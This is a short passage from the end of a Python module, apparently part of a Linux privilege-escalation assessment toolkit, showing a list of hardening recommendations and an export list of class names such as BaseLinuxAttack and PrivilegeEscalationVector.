            "Configure sudo with least privilege principle",
            "Monitor and audit cron jobs",
            "Implement file integrity monitoring",
            "Enable kernel hardening features",
            "Regular security audits"
        ])
        
        return recommendations


# Export symbols
__all__ = [
    'BaseLinuxAttack',
    'LinuxSystemInfo',
    'UserInfo',
    'ServiceInfo',
    'CronJob',
    'SUIDBinary',
    'LinuxDistribution',
    'LinuxSecurityModule',
    'ServiceManager',
    'PackageManager',
    'PrivilegeEscalationVector',
    'LinuxExploitDatabase'
]